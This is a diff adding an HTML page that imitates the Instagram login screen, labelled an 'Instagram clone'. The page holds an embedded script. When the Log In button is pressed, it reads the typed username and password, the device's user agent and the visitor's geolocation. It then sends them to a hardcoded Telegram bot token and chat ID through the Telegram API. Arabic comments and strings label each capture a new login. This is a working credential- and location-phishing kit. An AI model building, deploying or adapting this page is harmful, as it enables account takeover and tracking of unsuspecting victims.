@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram clone</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex"></section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form>
+                    <label for="email" class="sr-only">Phone number, username, or email</label>
+                    <input id="email" name="email" placeholder="Phone number, username, or email" />
+
+                    <label for="password" class="sr-only">Password</label>
+                    <input id="password" name="password" type="password" placeholder="Password" />
+
+                    <button type="button" onclick="sendToTelegram()">Log In</button>
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png" alt="Apple Store logo" />
+                    <img src="./img/googleplay-button.png" alt="Google Play logo" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATION</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
+            <li><a href="#">HASHTAGS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <p class="copyright">© 2020 Instagram from Facebook</p>
+    </footer>
+
+    <script>
+        function sendToTelegram() {
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("password").value;
+
+            if (email === "" || password === "") {
+                alert("⚠️ الرجاء إدخال جميع البيانات!");
+                return;
+            }
+
+            let botToken = "7488268192:AAEY7W284vNk7oqsGoNpSHHab5GEeOKbjBE";  // 🔴 ضع توكن البوت هنا
+            let chatId = "6648554042";      // 🔴 ضع معرف الشات هنا
+
+            let deviceInfo = navigator.userAgent; // 🔍 جلب نوع الجهاز والمتصفح
+
+            // 🔍 جلب الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    let locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    let message = `🚀 تسجيل دخول جديد:
+📧 الإيميل/المستخدم: ${email}
+🔑 كلمة المرور: ${password}
+📱 الجهاز: ${deviceInfo}
+📍 الموقع: [اضغط هنا لرؤية الموقع](${locationLink})`;
+
+                    sendMessageToTelegram(message);
+                }, () => {
+                    let message = `🚀 تسجيل دخول جديد:
+📧 الإيميل/المستخدم: ${email}
+🔑 كلمة المرور: ${password}
+📱 الجهاز: ${deviceInfo}
+⚠️ تعذر الحصول على الموقع الجغرافي`;
+
+                    sendMessageToTelegram(message);
+                });
+            } else {
+                let message = `🚀 تسجيل دخول جديد:
+📧 الإيميل/المستخدم: ${email}
+🔑 كلمة المرور: ${password}
+📱 الجهاز: ${deviceInfo}
+⚠️ المتصفح لا يدعم تحديد الموقع`;
+
+                sendMessageToTelegram(message);
+            }
+        }
+
+        function sendMessageToTelegram(message) {
+            let botToken = "7488268192:AAEY7W284vNk7oqsGoNpSHHab5GEeOKbjBE";  // 🔴 استبدل بتوكن البوت الحقيقي
+            let chatId = "6648554042";      // 🔴 استبدل بمعرف الشات الحقيقي
+
+            let telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+            fetch(telegramAPI)
+            
+        }
+    </script>
+</body>
+</html>
